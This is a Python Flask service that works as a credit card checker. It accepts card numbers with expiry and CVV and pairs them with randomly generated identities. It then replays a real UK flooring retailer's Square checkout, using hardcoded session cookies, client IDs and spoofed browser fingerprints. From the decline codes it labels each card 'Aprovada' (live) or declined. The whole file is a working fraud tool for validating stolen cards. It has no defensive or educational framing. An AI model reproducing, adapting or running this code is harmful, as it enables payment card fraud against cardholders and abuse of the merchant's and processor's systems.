from flask import Flask, request, jsonify
import requests
import json
import re
import os
import logging

app = Flask(__name__)

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

def get_str_between(string, start, end):
    try:
        return re.search(f'{start}(.*?){end}', string).group(1)
    except:
        return ''

@app.route('/gateway=squareauth/key=rockysoon', methods=['GET'])
def handle_square_payment():
    # Delete cookie.txt if it exists
    if os.path.exists('cookie.txt'):
        os.remove('cookie.txt')

    # Fetch random user details with fallback
    try:
        response = requests.get('https://randomuser.me/api/1.2/?nat=us', timeout=5)
        response.raise_for_status()  # Raise an exception for HTTP errors
        data = response.json()['results'][0]
        name = data['name']['first']
        last = data['name']['last']
        email = data['email']
        street = data['location']['street']  # Updated to match API structure
        city = data['location']['city']
        state = data['location']['state']
        phone = data['phone']
        postcode = data['location']['postcode']
        logger.info("Successfully fetched random user details")
    except Exception as e:
        logger.error(f"Failed to fetch random user details: {str(e)}")
        # Fallback default values based on provided API structure
        name = "John"
        last = "Doe"
        email = "john.doe@example.com"
        street = "123 Main St"
        city = "New York"
        state = "NY"
        phone = "123-456-7890"
        postcode = "10001"

    # Parse credit card details from query parameter
    lista = request.args.get('cc', '')
    if not lista:
        return jsonify({'status': 'error', 'message': 'Missing cc parameter'}), 400

    try:
        cc, mes, ano, cvv = lista.split('|')
        ano = ano[:4]
        last4 = cc[-4:] if len(cc) >= 16 else cc[-4:]
        bin = cc[:8]
        
        # Convert month to integer
        mes = str(int(mes.lstrip('0')))
        
        # Determine card type
        typew = 'VI' if cc.startswith('4') else 'MC' if cc.startswith('5') else ''
    except:
        return jsonify({'status': 'error', 'message': 'Invalid cc format. Use cc|mes|ano|cvv'}), 400

    # First Request: Get card nonce
    post_data = {
        'client_id': os.getenv('SQUARE_CLIENT_ID', 'sq0idp-44DdJoMjFy9fTcbhVfTDKw'),
        'location_id': os.getenv('SQUARE_LOCATION_ID', 'YPRFA9B0NPNCZ'),
        'session_id': os.getenv('SQUARE_SESSION_ID', 'iKQpWCAj9kBXXgVvouaNVQoFi4A1rLkog7NchS_w4fKHwICY_rDRKz2n4bGbDUpzmAwUdjqvRjTrFot8IGI='),
        'website_url': 'https://www.flooringhut.co.uk/',
        'squarejs_version': '27d3bdf1bc',
        'analytics_token': os.getenv('SQUARE_ANALYTICS_TOKEN', 'ZWSHAERBO5QMFU6ZPSURZB7GB47BPK2PATUZG3NJCS67RUOANO4NTXKRPQLI2KI2FDZ4IRULBFJYELZAA772YYWHKZDST5MH'),
        'card_data': {
            'number': cc,
            'exp_month': int(mes),
            'exp_year': int(ano),
            'cvv': cvv,
            'billing_postal_code': 'AS959FF'
        }
    }

    headers = {
        'authority': 'pci-connect.squareup.com',
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/json; charset=UTF-8',
        'cookie': '_savt=9f48ac9e-3f0a-408e-a714-54c44294f634',
        'origin': 'https://pci-connect.squareup.com',
        'referer': 'https://pci-connect.squareup.com/v2/iframe?type=main&app_id=sq0idp-44DdJoMjFy9fTcbhVfTDKw&host_name=www.flooringhut.co.uk&location_id=YPRFA9B0NPNCZ&version=27d3bdf1bc',
        'sec-ch-ua-mobile': '?0',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36',
        'x-js-id': 'undefined'
    }

    try:
        response = requests.post('https://pci-connect.squareup.com/v2/card-nonce?_=1622802632941.176&version=27d3bdf1bc', json=post_data, headers=headers, timeout=5)
        response.raise_for_status()
        result = response.json()
        cnon = get_str_between(response.text, '"card_nonce":"', '"')
        if not cnon:
            logger.error("Failed to retrieve card nonce")
            return jsonify({'status': 'error', 'message': 'Failed to retrieve card nonce'}), 500
        logger.info("Successfully retrieved card nonce")
    except Exception as e:
        logger.error(f"First request failed: {str(e)}")
        return jsonify({'status': 'error', 'message': f'First request failed: {str(e)}'}), 500

    # Second Request: Verify payment
    post_data = {
        'browser_fingerprint_by_version': [
            {
                'payload_json': '{"components":{"user_agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36","language":"en-US","color_depth":24,"resolution":[1536,864],"available_resolution":[1474,864],"timezone_offset":-330,"session_storage":1,"local_storage":1,"open_database":1,"cpu_class":"unknown","navigator_platform":"Win32","do_not_track":"unknown","regular_plugins":["Chrome PDF Plugin::Portable Document Format::application/x-google-chrome-pdf~pdf","Chrome PDF Viewer::::application/pdf~pdf","Native Client::::application/x-nacl~,application/x-pnacl~"],"adblock":false,"has_lied_languages":false,"has_lied_resolution":false,"has_lied_os":false,"has_lied_browser":false,"touch_support":[0,false,false],"js_fonts":["Arial","Arial Black","Arial Narrow","Book Antiqua","Bookman Old Style","Calibri","Cambria","Cambria Math","Century","Century Gothic","Century Schoolbook","Comic Sans MS","Consolas","Courier","Courier New","Garamond","Georgia","Helvetica","Impact","Lucida Bright","Lucida Calligraphy","Lucida Console","Lucida Fax","Lucida Handwriting","Lucida Sans","Lucida Sans Typewriter","Lucida Sans Unicode","Microsoft Sans Serif","Monotype Corsiva","MS Gothic","MS Outlook","MS PGothic","MS Reference Sans Serif","MS Sans Serif","MS Serif","Palatino Linotype","Segoe Print","Segoe Script","Segoe UI","Segoe UI Light","Segoe UI Semibold","Segoe UI Symbol","Tahoma","Times","Times New Roman","Trebuchet MS","Verdana","Wingdings","Wingdings 2","Wingdings 3"]},"fingerprint":"19fcdee54dc489b9dbd92ee359e8b521"}',
                'payload_type': 'fingerprint-v1'
            },
            {
                'payload_json': '{"components":{"language":"en-US","color_depth":24,"resolution":[1536,864],"available_resolution":[1474,864],"timezone_offset":-330,"session_storage":1,"local_storage":1,"open_database":1,"cpu_class":"unknown","navigator_platform":"Win32","do_not_track":"unknown","regular_plugins":["Chrome PDF Plugin::Portable Document Format::application/x-google-chrome-pdf~pdf","Chrome PDF Viewer::::application/pdf~pdf","Native Client::::application/x-nacl~,application/x-pnacl~"],"adblock":false,"has_lied_languages":false,"has_lied_resolution":false,"has_lied_os":false,"has_lied_browser":false,"touch_support":[0,false,false],"js_fonts":["Arial","Arial Black","Arial Narrow","Book Antiqua","Bookman Old Style","Calibri","Cambria","Cambria Math","Century","Century Gothic","Century Schoolbook","Comic Sans MS","Consolas","Courier","Courier New","Garamond","Georgia","Helvetica","Impact","Lucida Bright","Lucida Calligraphy","Lucida Console","Lucida Fax","Lucida Handwriting","Lucida Sans","Lucida Sans Typewriter","Lucida Sans Unicode","Microsoft Sans Serif","Monotype Corsiva","MS Gothic","MS Outlook","MS PGothic","MS Reference Sans Serif","MS Sans Serif","MS Serif","Palatino Linotype","Segoe Print","Segoe Script","Segoe UI","Segoe UI Light","Segoe UI Semibold","Segoe UI Symbol","Tahoma","Times","Times New Roman","Trebuchet MS","Verdana","Wingdings","Wingdings 2","Wingdings 3"]},"fingerprint":"e675a5d2d13511609b7e5a63fdb1f256"}',
                'payload_type': 'fingerprint-v1-sans-ua'
            }
        ],
        'browser_profile': {
            'components': '{"user_agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36","language":"en-US","color_depth":24,"resolution":[1536,864],"available_resolution":[1474,864],"timezone_offset":-330,"session_storage":1,"local_storage":1,"open_database":1,"cpu_class":"unknown","navigator_platform":"Win32","do_not_track":"unknown","regular_plugins":["Chrome PDF Plugin::Portable Document Format::application/x-google-chrome-pdf~pdf","Chrome PDF Viewer::::application/pdf~pdf","Native Client::::application/x-nacl~,application/x-pnacl~"],"adblock":false,"has_lied_languages":false,"has_lied_resolution":false,"has_lied_os":false,"has_lied_browser":false,"touch_support":[0,false,false],"js_fonts":["Arial","Arial Black","Arial Narrow","Book Antiqua","Bookman Old Style","Calibri","Cambria","Cambria Math","Century","Century Gothic","Century Schoolbook","Comic Sans MS","Consolas","Courier","Courier New","Garamond","Georgia","Helvetica","Impact","Lucida Bright","Lucida Calligraphy","Lucida Console","Lucida Fax","Lucida Handwriting","Lucida Sans","Lucida Sans Typewriter","Lucida Sans Unicode","Microsoft Sans Serif","Monotype Corsiva","MS Gothic","MS Outlook","MS PGothic","MS Reference Sans Serif","MS Sans Serif","MS Serif","Palatino Linotype","Segoe Print","Segoe Script","Segoe UI","Segoe UI Light","Segoe UI Semibold","Segoe UI Symbol","Tahoma","Times","Times New Roman","Trebuchet MS","Verdana","Wingdings","Wingdings 2","Wingdings 3"]}',
            'fingerprint': '19fcdee54dc489b9dbd92ee359e8b521',
            'version': '0f725b5aa454b79bda2c7aac780dfa45ea6a6f5b',
            'website_url': 'https://www.flooringhut.co.uk/'
        },
        'client_id': os.getenv('SQUARE_CLIENT_ID', 'sq0idp-44DdJoMjFy9fTcbhVfTDKw'),
        'payment_source': cnon,
        'universal_token': {'token': os.getenv('SQUARE_LOCATION_ID', 'YPRFA9B0NPNCZ'), 'type': 'UNIT'},
        'verification_details': {
            'billing_contact': {
                'address_lines': [f'{street}'],
                'city': city,
                'country': 'GB',
                'email': email,
                'family_name': last,
                'given_name': name,
                'phone': phone,
                'postal_code': str(postcode)
            },
            'intent': 'CHARGE',
            'total': {'amount': 9181, 'currency': 'GBP'}
        }
    }

    headers = {
        'authority': 'connect.squareup.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/json',
        'cookie': '_savt=9f48ac9e-3f0a-408e-a714-54c44294f634',
        'origin': 'https://connect.squareup.com',
        'referer': 'https://connect.squareup.com/payments/data/frame.html?referer=https%3A%2F%2Fwww.flooringhut.co.uk%2Fcheckout%2F%23payment',
        'sec-ch-ua-mobile': '?0',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36'
    }

    try:
        response = requests.post('https://connect.squareup.com/v2/analytics/verifications', json=post_data, headers=headers, timeout=5)
        response.raise_for_status()
        verf = get_str_between(response.text, '"token":"', '"')
        if not verf:
            logger.error("Failed to retrieve verification token")
            return jsonify({'status': 'error', 'message': 'Failed to retrieve verification token'}), 500
        logger.info("Successfully retrieved verification token")
    except Exception as e:
        logger.error(f"Verification request failed: {str(e)}")
        return jsonify({'status': 'error', 'message': f'Verification request failed: {str(e)}'}), 500

    # Third Request: Submit payment
    post_data = {
        'cartId': 'JYlC09CE5xz7gnAXcew75FQlOrScCFD8',
        'billingAddress': {
            'countryId': 'GB',
            'regionCode': '',
            'region': '',
            'street': [f'{street}'],
            'company': '',
            'telephone': phone,
            'fax': '',
            'postcode': str(postcode),
            'city': city,
            'firstname': name,
            'lastname': last,
            'saveInAddressBook': None
        },
        'paymentMethod': {
            'method': 'squareup_payment',
            'additional_data': {
                'cc_cid': '',
                'cc_ss_start_month': '',
                'cc_ss_start_year': '',
                'cc_ss_issue': '',
                'cc_type': typew,
                'cc_exp_year': ano,
                'cc_exp_month': mes,
                'cc_number': '',
                'nonce': cnon,
                'digital_wallet': 'NONE',
                'cc_last_4': last4,
                'buyerVerificationToken': verf,
                'display_form': True
            }
        },
        'email': email
    }

    headers = {
        'authority': 'www.flooringhut.co.uk',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/json',
        'cookie': '_ga=GA1.4.879687577.1622574589; _fbp=fb.2.1622574592043.1781157306; apay-session-set=TZE5z0OnAoRAB2g8acqfX4%2FFrkcv46nmBSd5MVieZ6KBY2FgAom6ayqKFtveHj4%3D; __tawkuuid=e::flooringhut.co.uk::hA/EEuGCXS4FRGBvh+kavmXa7Tf5ueVgBEXXEWzmH0dBrFCDVlr2DS/e9tk0cSYE::2; PHPSESSID=plk553oskupgddsvh8krc9obcf; _gid=GA1.4.1003854987.1622802435; form_key=34QSSuNAQ1lQkyKG; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-cache-sessid=true; mage-messages=; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; form_key=34QSSuNAQ1lQkyKG; private_content_version=e3c6626209c36f744917fa0128abf5c8; TawkConnectionTime=0; language=en_GB; amazon-pay-connectedAuth=connectedAuth_general; section_data_ids=%7B%22cart%22%3A1622802456%2C%22directory-data%22%3A1622802449%2C%22messages%22%3A1622802612%7D',
        'origin': 'https://www.flooringhut.co.uk',
        'referer': 'https://www.flooringhut.co.uk/checkout/',
        'sec-ch-ua-mobile': '?0',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest'
    }

    try:
        response = requests.post('https://www.flooringhut.co.uk/rest/fhdomestic/V1/guest-carts/fwiIbJjCkX80SP7H9iZJHPeKbHB6wAAa/payment-information', json=post_data, headers=headers, timeout=5)
        response.raise_for_status()
        result_text = response.text
        resp = get_str_between(result_text, "<div id='validation_message_2_4' class='gfield_description validation_message' aria-live='polite'>", '</div>')
        logger.info("Successfully submitted payment request")
    except Exception as e:
        logger.error(f"Payment request failed: {str(e)}")
        return jsonify({'status': 'error', 'message': f'Payment request failed: {str(e)}'}), 500

    # Process response
    card_info = f'{cc}|{mes}|{ano}|{cvv}'
    if 'Authorization error: \'ADDRESS_VERIFICATION_FAILURE\'' in result_text:
        message = f'{card_info} [SQUAREUP] [★ WOLFIE ★ ] #Aprovada R: CVV MATCHED'
        status = 'success'
    elif 'Authorization error: \'CVV_FAILURE\'' in result_text:
        message = f'{card_info} [SQUAREUP] [★ WOLFIE ★ ] #Aprovada R: CNN MATCHED'
        status = 'success'
    elif 'Authorization error: \'GENERIC_DECLINE\'' in result_text:
        message = f'{card_info} [SQUAREUP] [★ WOLFIE ★ ] [SITE CANT MASS CHECK] R: DEAD- SITE CANT MASS CHECK'
        status = 'error'
    elif 'Authorization error: \'TRANSACTION_LIMIT\'' in result_text:
        message = f'{card_info} [SQUAREUP] [★ WOLFIE ★ ] [TRANSACTION NOT ALLOWED]#Aprovada R: CVV MATCHED'
        status = 'error'
    else:
        message = f'{card_info} [SQUAREUP] [★ WOLFIE ★ ] [#Declined] R: DECLINED'
        status = 'error'

    return jsonify({
        'status': status,
        'message': message,
        'cc': lista,
        'response': resp if resp else 'No validation message'
    }), 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)
